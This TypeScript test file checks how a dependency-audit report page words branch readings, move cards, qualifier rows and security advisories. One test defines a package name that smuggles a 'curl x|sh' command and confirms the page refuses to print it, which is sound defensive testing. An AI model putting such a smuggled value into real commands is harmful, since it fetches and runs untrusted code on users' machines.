// The rows of SPEC §7.9.13 that no recorded case reaches (§7.9.14), pinned on synthetic fields, and the
// open sets the page must word without parsing lockrot's strings.
import { describe, expect, test } from "vitest";

import { commandLines, moveCards } from "../../../src/domain/moveCards";
import { qualifiers } from "../../../src/domain/qualifierRows";
import { plain } from "../../../src/domain/rich";
import { securityBlock } from "../../../src/domain/securityBlock";
import { readingRich, verdictBlock, verdictLineText } from "../../../src/domain/verdictBlock";
import type { Finding, RepositoryMetadata, Run, S8, S9row } from "../../../src/model/report";
import { modelCases } from "../words/recorded";

/** A model case, copied so a test can set the field it is about. */
function modelCase(name: string): { finding: Finding; run: Run; metadata: RepositoryMetadata | null } {
  const found = modelCases().find((c) => c.name === name);
  if (found === undefined) throw new Error(`no case ${name}`);
  return structuredClone({ finding: found.finding, run: found.run, metadata: found.metadata });
}

function s8Of(finding: Finding): S8 {
  const s8 = finding.signals.find((s) => s.id === "S8");
  if (s8 === undefined) throw new Error("the case has no S8");
  return s8.data as S8;
}

function s9RowsOf(finding: Finding): S9row[] {
  const s9 = finding.signals.find((s) => s.id === "S9");
  if (s9 === undefined) throw new Error("the case has no S9");
  return (s9.data as { advisories: S9row[] }).advisories;
}

const readingTexts = (finding: Finding, run: Run, metadata: RepositoryMetadata | null): string[] =>
  verdictBlock(finding, run, metadata).readings.map((r) => plain(readingRich(r)));

describe("the left-behind reading", () => {
  test("G27: names the higher branch's release when its row's highest tag is another one", () => {
    const { finding, run, metadata } = modelCase("B");
    const row = metadata?.branches.find((r) => r.branch === "5.x");
    if (row === undefined) throw new Error("B has a 5.x row");
    row.highest = "v5.4.53";

    expect(readingTexts(finding, run, metadata)[0]).toBe(
      "Its branch, 2.x, had its last release 6.9 years ago, while 5.x released v5.4.52 0.4 years ago. See Release branches.",
    );
  });

  test("G28: with no Release branches, names the reachable branch's release and no jump", () => {
    const { finding, run } = modelCase("B");

    expect(readingTexts(finding, run, null)[0]).toBe(
      "Branch 2.x had its last release 6.9 years ago, while 5.x released v5.4.52 0.4 years ago.",
    );
  });

  test("G29: with no reachable branch, names the newest branch and the php it needs", () => {
    const { finding, run } = modelCase("B");
    const s8 = s8Of(finding);
    s8.reachable_branch = null;
    s8.newest_php = ">=8.4.1";

    expect(readingTexts(finding, run, null)[0]).toBe(
      `Branch 2.x had its last release 6.9 years ago; the newest branch, ${s8.newest_branch}, released ${s8.newest_version} 0.1 years ago and needs php >=8.4.1.`,
    );
  });

  test("G29: leaves the php out when the newest branch records none", () => {
    const { finding, run } = modelCase("B");
    const s8 = s8Of(finding);
    s8.reachable_branch = null;
    s8.newest_php = null;

    expect(readingTexts(finding, run, null)[0]).toMatch(/released v\S+ 0\.1 years ago\.$/);
  });
});

describe("G35: the installed branch's fix, when no ladder rung says it", () => {
  test.each([
    [1, 1, "update", "It is fixed on 2.x"],
    [1, 1, "raise-php", "It is fixed on 2.x, by a release that needs a php floor raise"],
    [1, 1, "a-later-kind", "It is fixed on 2.x (a-later-kind)"],
  ])("fixed %i of %i by %s", (fixed, of, kind, clause) => {
    const { finding, run } = modelCase("B");
    if (finding.security.status !== "vulnerable") throw new Error("B is vulnerable");
    finding.security.installed_branch_fixes = {
      fixed,
      unknown: 0,
      of,
      fix_kind: kind,
      lowest: null,
      newest: null,
      held_by: [],
      if_applied: null,
      check: null,
    };

    expect(readingTexts(finding, run, null).at(-1)).toContain(`). ${clause}.`);
  });
});

describe("the opening of a decided_by the page does not know (G13)", () => {
  test("words each part's own grade, and a part below the lowest grade", () => {
    const { finding, run, metadata } = modelCase("stale-only");
    if (!("decided_by" in finding.score)) throw new Error("stale-only is graded");
    finding.score.decided_by = "a-later-rule";

    expect(verdictLineText(verdictBlock(finding, run, metadata))).toBe(
      "Medium at 8: maintenance (stale) alone grades it medium, the advisory part alone counts below low.",
    );
  });
});

describe("the move's action for an open set (G91 to G93)", () => {
  const action = (finding: Finding, run: Run): string => plain(moveCards(finding, run)[0]?.action ?? []);

  test.each([
    ["no_higher_release", "No higher branch has released recently enough to move to"],
    ["higher_undated", "lockrot could not date the releases of the higher branches, so it names no move"],
  ])("a no-move with reason %s", (reason, words) => {
    const { finding, run } = modelCase("stale-only");
    if (finding.next_step === null) throw new Error("stale-only has a move");
    finding.next_step.reason = reason;

    expect(action(finding, run)).toBe(words);
  });

  test.each(["a_later_reason", "toString"])(
    "a no-move reason the page does not know (%s) prints lockrot's text",
    (reason) => {
      const { finding, run } = modelCase("stale-only");
      if (finding.next_step === null) throw new Error("stale-only has a move");
      finding.next_step.reason = reason;
      finding.next_step.text = "no move: a later reason.";

      expect(action(finding, run)).toBe("Next step: no move: a later reason.");
    },
  );

  test("a kind the page does not know, with no text, reads its kind and reason", () => {
    const { finding, run } = modelCase("stale-only");
    if (finding.next_step === null) throw new Error("stale-only has a move");
    finding.next_step.kind = "a-later-kind";
    finding.next_step.reason = "some_reason";
    finding.next_step.text = "";

    expect(action(finding, run)).toBe("Next step: a later kind (some reason)");
    expect(moveCards(finding, run)[0]?.heading).toBe("Next step");
  });
});

describe("the Composer notes of an open set", () => {
  test("a composer_moves_because value the page does not know reads as its words, once", () => {
    const { finding, run } = modelCase("B-also-dagger");
    if (finding.next_step === null) throw new Error("B-also‡ has a move");
    finding.next_step.composer_moves_because = ["a_later_reason" as never];
    const [also] = finding.next_step.also;
    if (also === undefined) throw new Error("B-also‡ has an also[] move");
    also.composer_moves_because = ["a_later_reason" as never];

    const cards = moveCards(finding, run);

    expect(cards.map((card) => card.composer.map((note) => plain(note.text)))).toEqual([
      ["A later reason"],
      [],
    ]);
  });
});

describe("the qualifier rows of an open set", () => {
  test("G45: a halving whose reason the page does not know names its divisor and id", () => {
    const { finding, run } = modelCase("xmlseclibs");
    if (!("modifiers" in finding.score)) throw new Error("xmlseclibs is graded");
    const [modifier] = finding.score.modifiers;
    if (modifier === undefined) throw new Error("xmlseclibs is halved");
    modifier.reason = "vendored";

    expect(qualifiers(finding, run).reach?.halving).toEqual(["Its maintenance is divided by 2 (vendored)"]);
  });

  test("G59: with no move card, the PHP row says the installed release does not run on the target", () => {
    const { finding, run } = modelCase("joomla-filter");
    finding.next_step = null;

    expect(qualifiers(finding, run).php).toBe(
      `Its installed release, ${finding.version}, needs php ${finding.installed_php.requires ?? ""}, which your target, ${run.target_php}, does not run: Composer will not install it there`,
    );
  });

  test("G63: a type entry, whose pattern is null, has no entry line", () => {
    const { finding, run } = modelCase("psr-log");
    if (finding.allowlist === null) throw new Error("psr-log is allowlisted");
    finding.allowlist.pattern = null;

    expect(qualifiers(finding, run).accepted?.entry).toBeNull();
  });
});

describe("Held by of a holder that is not graded", () => {
  test("carries no grade tag", () => {
    const { finding, run } = modelCase("holder-vuln-dagger");
    const held = finding.next_step?.held_by[0];
    if (held?.holder == null) throw new Error("holder-vuln‡ is held by a graded package");
    held.holder.verdict = "ok";
    held.holder.flag_ids = [];

    expect(moveCards(finding, run)[0]?.heldBy?.shown[0]).toMatchObject({
      grade: null,
      meta: ["requires ", { code: held.constraint }],
    });
  });
});

describe("the Security row", () => {
  test("G130: a row that repeats an earlier row's CVE points to it", () => {
    const { finding, run, metadata } = modelCase("B");
    const rows = s9RowsOf(finding);
    const [first] = rows;
    if (first === undefined) throw new Error("B has an advisory");
    rows.push({ ...first, id: "GHSA-2222-3333-4444", deciding: false });

    const block = securityBlock(finding, run, metadata);

    expect(block.caption).toEqual([
      `By severity. Each affects your version, ${finding.version}.`,
      "1 repeats the CVE of another row.",
    ]);
    expect(block.rows[1]?.sameAs).toEqual({ id: first.id, at: 0 });
  });

  test("G128: the partial update lists every flag it clears before the advisories", () => {
    const { finding, run, metadata } = modelCase("partial-op-dagger");
    if (finding.security.status !== "vulnerable" || finding.security.partial === null)
      throw new Error("partial-op‡ has a partial update");
    finding.security.partial.clears = [
      { kind: "flag", id: "left-behind", basis: "branch_releasing" },
      ...finding.security.partial.clears,
    ];

    expect(plain(securityBlock(finding, run, metadata).meanwhile ?? [])).toContain(
      "which clears left-behind, old-promise and 1 of its 2 advisories (",
    );
  });
});

describe("a command only for a name that passes the argument rule (SPEC §5.6)", () => {
  const HOSTILE = "a/b;curl x|sh;#";

  test.each([
    ["vendor/pkg", [{ code: "composer update vendor/pkg" }]],
    [HOSTILE, ["an update of this package"]],
    ["-a/b", ["an update of this package"]],
    ["--no-update", ["an update of this package"]],
  ])("the Meanwhile line of %s", (name, command) => {
    const { finding, run, metadata } = modelCase("partial");
    finding.package = name;

    expect(securityBlock(finding, run, metadata).meanwhile?.[1]).toEqual(command[0]);
  });

  test("a move whose argv holds a character the page does not print shows the refusal on every line", () => {
    const { finding, run } = modelCase("B");
    if (finding.next_step === null) throw new Error("B has a move");
    finding.next_step.commands = [["composer", "require", HOSTILE]];

    const [card] = moveCards(finding, run);

    expect(commandLines(card?.argvs ?? [])).toEqual([
      "This command holds characters the page does not print.",
    ]);
  });
});

describe("G106: the new-major note and the move check", () => {
  const noteOf = (check: unknown): string[] => {
    const { finding, run } = modelCase("B");
    if (finding.next_step === null) throw new Error("B has a move");
    finding.next_step = { ...finding.next_step, check } as typeof finding.next_step;
    return (moveCards(finding, run)[0]?.composer ?? []).map((n) => plain(n.text));
  };
  const SOLVE = ", which lockrot does not solve";

  test.each([
    ["resolves", { result: "resolves", form: "inline", reason: null }],
    ["refused", { result: "refused", form: null, reason: null }],
  ])("drops the clause when the check %s", (_, check) => {
    expect(noteOf(check)).toContain("A new major brings its own requirements");
  });

  test.each([
    ["not_checked", { result: "not_checked", form: null, reason: "offline" }],
    ["null", null],
  ])("keeps the clause when the check is %s", (_, check) => {
    expect(noteOf(check)).toContain(`A new major brings its own requirements${SOLVE}`);
  });
});
